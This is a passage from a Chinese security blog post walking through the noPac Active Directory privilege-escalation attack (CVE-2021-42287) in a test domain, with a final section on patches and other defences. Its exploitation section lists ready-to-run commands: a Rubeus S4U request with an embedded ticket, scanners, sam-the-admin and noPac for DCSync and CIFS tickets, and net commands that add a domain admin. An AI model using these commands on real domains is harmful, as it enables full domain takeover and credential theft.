+<p>当我们把第四步执行完，即修改创建的机器账号的sAMAccountName为其原先的值，在第五步将使用之前获取到的TGT向域控发起S4U2Self请求服务票据，这里就设计到一个KDC的漏洞—CVE-2021-42287，当我们使用S4U为机器账号申请ST票据时，因为域内没有sAMAccountName值为DC的账号，那么KDC找不到的时候，会尝试在sAMAccountName后加上$符号，那么域控就明白了，原来是DC$(即域控的机器账号)来申请票据呢，因为KDC便把域控机器账号的票据给了请求者，那么请求者便可以申请访问域控主机的cifs票据了，或者直接申请个ldap票据，进行dcsync操作，这里也回答了第四问的问题，由此，该漏洞便被提升到了顶端。</p>
+<h3 id="第七问：当KDC验证用户提交的S4U请求时，怎么不验证账号密码或者用户权限呢？"><a href="#第七问：当KDC验证用户提交的S4U请求时，怎么不验证账号密码或者用户权限呢？" class="headerlink" title="第七问：当KDC验证用户提交的S4U请求时，怎么不验证账号密码或者用户权限呢？"></a>第七问：当KDC验证用户提交的S4U请求时，怎么不验证账号密码或者用户权限呢？</h3><p>原因在于kerberos协议就是个无状态的协议，何为无状态的协议？就是个HTTP认证一样，不会去验证你之前的请求是否正确，只要有所需的数据即可跳过之前的认证。<br>接下来便是请求ST票据的过程了,我这里申请的是cifs票据<br>./Rubeus.exe s4u /self /impersonateuser:”Administrator” /altservice:”cifs/dc.test.com” /dc:”dc.test.com” /ptt /ticket:doIEhjCCBIKgAwIBBaEDAgEWooIDrTCCA6lhggOlMIIDoaADAgEFoQobCFRFU1QuQ09Noh0wG6ADAgECoRQwEhsGa3JidGd0Gwh0ZXN0LmNvbaOCA20wggNpoAMCARKhAwIBAqKCA1sEggNXoz29uDX6ZX0H1L+gMS3+GrCkJmk0cchvc1/FRt95/3nAm37RZjUQDI8e/jajXVh4YkfpxSaF+8WCiasvOClWElotS0s8iGCmUiN/r124P7zEGaGnPBXFEmfmYhRicblSHPVdELMDRF4J/5C5xLMDvGfpZtP2bY2oYUdh8ZsGW1XDIvsH913bw9fg1cQNOvA6SG9d/8Au8adDBnJyEXeZ+WTKzV/atVBcn3gIzyeJeU9L0Z0qvwqGH7HAxMFMajxdLz11P4du7bIo3HCG7XYR3Vo9MRoawcMzajIl+Zu2dORdm2bZ42hDuUsXMu7HSFC4s6zlpCQLHRIqE5f/e2JlqcewsCSr9l6/vnd9yVZmC41hslHgR5vOt8GRzkszMmE/lIyWMdmFjmS6a6wiBHe6AAfSoC1651lqzFc2pNZZFRhs9bkHCscg9vuBjtfGk4MiQiy2MEeF9KwYhzHIsdF9DNQV0gVxg3DRoNLZM+PU6/wlBHhxlGsO7fZeIXpCN97Q8gcfRHcQs3Ra8elphMc0fr4RF5D6saTZOSvB2TCIh7uA/dNcvq4enXy7WW0cgnE8xi9AThoLg1eAltsvdoM4EvGqZCknoaNbqh177Mk3ieaKO1vW+9b0RxgO2DDbCGPYbPdfo9l3SXCPTU2r9g5GnhtiwTwZj6g5QFGLr6+x5gNNvdIeqRfQFWJ2L7YqPzYvNeyfejrAbhm9It3L+5x2jJENInbimWMKyUoDeuAqqkpVBQLKp5SGcRuPt/iDtrm39CSwjEkLurUnukfI4YfQOAWYyzUzFHozcsyqlWCngB5P8iu+KTCSc8KNduDRsMj9i6cHZRwqNmhp3JSGdaY1c0FjuF6CmB0LwR0aEpJOm2OopKCLOBM/qcJ/dfTbKsoeBw9JR2v/3yr4t8TrSQrK2abGkyc4zaps7D7qiAIj/lwcb7CgjBNpBp00rmxHzMBCJ11sY4zGI1V6qtzmbal7vxbUCTePq5+kUMX3GTXUKij64Yc2op/eZI667gI5yGBnZXWOM/CBRu240V3YtLzGufN+zdRmHAP6Q/NRhrZC6dENdPesnGSddBIjXpDtH64lDwEimaNw2/6XjZGubgndnWSEiAS/Hxx/O6IqZjEyQs5yCU79IIYWo4HEMIHBoAMCAQCigbkEgbZ9gbMwgbCgga0wgaowgaegGzAZoAMCARehEgQQeK78RFtWUOHIuxDkLZTKp6EKGwhURVNULkNPTaIPMA2gAwIBAaEGMAQbAkRDowcDBQBA4QAApREYDzIwMjIwNzE5MDgyMjQ0WqYRGA8yMDIyMDcxOTE4MjI0NFqnERgPMjAyMjA3MjYwODIyNDRaqAobCFRFU1QuQ09NqR0wG6ADAgECoRQwEhsGa3JidGd0Gwh0ZXN0LmNvbQ==<br><img src="./images/image-20230712235145482.png" alt="image-20230712235145482"></p>
+<h3 id="第八问：为什么我们这里要是有S4U2Self来请求呢？"><a href="#第八问：为什么我们这里要是有S4U2Self来请求呢？" class="headerlink" title="第八问：为什么我们这里要是有S4U2Self来请求呢？"></a>第八问：为什么我们这里要是有S4U2Self来请求呢？</h3><p>细心的朋友应该能注意到我们在使用Rubeus的时候，添加了参数/self表示使用S4U2Self来请求，这里来讲一下为什么要这么做：</p>
+<p>我们在使用机器账号申请TGT时是没有PAC的，其中的PAC就是个用户凭证，当KDC拿到PAC之后会去解密，获取用户的sid,以及所在组，然后在判断用户是否有访问该服务的权限，有哪些权限，并且PAC对应用户和服务全程都是不可见的并且是进行了签名，其他人无法篡改，只有KDC才能制作和查看。那么回到刚刚的问题上，S4U2Self有个特性，当KDC在校验S4U2Self请求合法后，它会根据S4U2Self模拟用户生成一个该用户的PAC，从而便能请求到具体的服务。</p>
+<h3 id="第九问：如果进入域内发现MAQ等于0，我们该怎么办呢？"><a href="#第九问：如果进入域内发现MAQ等于0，我们该怎么办呢？" class="headerlink" title="第九问：如果进入域内发现MAQ等于0，我们该怎么办呢？"></a>第九问：如果进入域内发现MAQ等于0，我们该怎么办呢？</h3><p>放弃漏洞or继续深入？</p>
+<p>当然得继续深入了，我们刚刚了解到当MAQ为0时便不能创建机器账号，也不能改对应的属性，那么我们能不能去寻找一些能修改已存在的机器账号的用户？在学习基于资源型的约束委派时，我们得知将机器拉入域中的账号，默认便对该机器有WriteProperty，那么便可以去查找域内存在mS-DS-CreatorSID的机器账号，然后对应找到目标用户，在拿到其权限后便可修改机器账号属性，从而实现该漏洞的利用。</p>
+<h2 id="三、漏洞利用："><a href="#三、漏洞利用：" class="headerlink" title="三、漏洞利用："></a>三、漏洞利用：</h2><p>在想要利用漏洞时，我习惯的是先去做漏洞扫描，然后在去利用，那么扫描也有两个情况：在目标主机上扫描和远程连接扫描，其实更推荐远程扫描，这样不至于触发告警</p>
+<h3 id="远程扫描："><a href="#远程扫描：" class="headerlink" title="远程扫描："></a>远程扫描：</h3><h4 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h4><p>当初号称是网络渗透的瑞士军刀，其功能也是十分的强大，也集成了该漏洞的扫描，使用账号密码进行连接-M指定nopac即可远程扫描：</p>
+<p>crackmapexec smb 域控ip -u ‘haha’ -p ‘www123456#’ -d test.com -M nopac crackmapexec smb 192.168.189.128 -u ‘haha’ -p ‘www123456#’ -d test.com -M nopac<br><img src="./images/image-20230712235607427.png" alt="image-20230712235607427"></p>
+<h4 id="使用nopac-py进行扫描"><a href="#使用nopac-py进行扫描" class="headerlink" title="使用nopac.py进行扫描"></a>使用nopac.py进行扫描</h4><p><a target="_blank" rel="noopener" href="https://github.com/knightswd/NoPacScan">https://github.com/knightswd/NoPacScan</a><br><img src="./images/image-20230712235642313.png" alt="image-20230712235642313"></p>
+<p>本地扫描：</p>
+<h4 id="使用noPac-exe进行扫描"><a href="#使用noPac-exe进行扫描" class="headerlink" title="使用noPac.exe进行扫描"></a>使用noPac.exe进行扫描</h4><p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a> 用法： .\noPac.exe scan -domain test.com -user haha -pass “www123456#”<br><img src="./images/image-20230712235654604.png" alt="image-20230712235654604"></p>
+<h3 id="Linux下利用："><a href="#Linux下利用：" class="headerlink" title="Linux下利用："></a>Linux下利用：</h3><h4 id="使用工具sam-the-admin一条龙："><a href="#使用工具sam-the-admin一条龙：" class="headerlink" title="使用工具sam-the-admin一条龙："></a>使用工具sam-the-admin一条龙：</h4><p><a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+<p>但是使用的时候需要注意一下作者在131行和133行使用的这两个工具默认系统没有安装<br><img src="../images/image-20230712235709531.png" alt="image-20230712235709531"></p>
+<p>如果安装了impacket之后，替换为python3 /usr/local/bin/smbexec.py和python3 /usr/local/bin/secretsdump.py即可</p>
+<p>python3 sam_the_admin.py “test.com/haha:www123456#” -dc-ip 192.168.189.128 -shell<br><img src="./images/image-20230712235729020.png" alt="image-20230712235729020"></p>
+<h3 id="彩蛋："><a href="#彩蛋：" class="headerlink" title="彩蛋："></a>彩蛋：</h3><p>这里如果我们将任意一台机器的sAMAccountName改为域控的主机名，那么这个漏洞就无法成功运行了，是个很有意思的情况，原因就在于在域内sAMAccountName是唯一的，不能重复，如果我们创建一个新的机器账号，并且将其sAMAccountName改为域控的主机名，那么就能简单的起到防御攻击者使用该漏洞去攻击的行为。<br>操作如下：<br><img src="./images/image-20230712235753409.png" alt="image-20230712235753409"></p>
+<p>接下来执行的时候脚本便会提示目标已打补丁，原因就在于sAMAccountName是唯一的，很有意思的发现。<br><img src="./images/image-20230712235807668.png" alt="image-20230712235807668"></p>
+<h3 id="Windows下利用："><a href="#Windows下利用：" class="headerlink" title="Windows下利用："></a>Windows下利用：</h3><p>使用noPac来进行攻击：</p>
+<h4 id="dcsyc"><a href="#dcsyc" class="headerlink" title="dcsyc"></a>dcsyc</h4><p>脚本 <a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+<p>python noPac.py zn.com/zs:123456 -dc-ip  192.168.1.1 -dc-host AD01  –impersonate administrator -dump</p>
+<h4 id="cifs"><a href="#cifs" class="headerlink" title="cifs"></a>cifs</h4><p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
+<p>noPac.exe -domain cagayan.com -user “dtcw” -pass “dtcw888”  /dc WIN-ROTLQJUNHDJ.zn.com  /mAccount demo10 /mPassword 1qaz@WSX /service cifs /ptt</p>
+<p> 注： mAccount为机器账号名 mPassword为机器账号密码</p>
+<p><img src="./images/image-20230712235830291.png" alt="image-20230712235830291"><br><img src="./images/image-20230712235841948.png" alt="image-20230712235841948"></p>
+<h4 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h4><p>在cifs 之后</p>
+<p>net user zs 1231231.a /add /domain  添加域用户</p>
+<p>net group “Domain Admins” admin11 /add /domain 添加到域管组</p>
+<h2 id="四、漏洞防御："><a href="#四、漏洞防御：" class="headerlink" title="四、漏洞防御："></a>四、漏洞防御：</h2><p>安装微软的补丁 KB5008602和KB5008380<br>修改AD域的MachineAccountQuota的属性值为0，但若属性值为0，也可以寻找mS-DS-CreatorSID来绕过。<br>使用我们彩蛋的方法，创建一个机器账号，将其samAccountName改为DC的主机名。<br>查找域内具有无效SamAccountName属性的任何计算机帐户<br>Get-ADComputer -Filter { samAccountName -notlike “*$” }<br><img src="./images/image-20230713002553150.png" alt="image-20230713002553150"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">💰</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2016-2020 Yelog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>Help us with donation</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
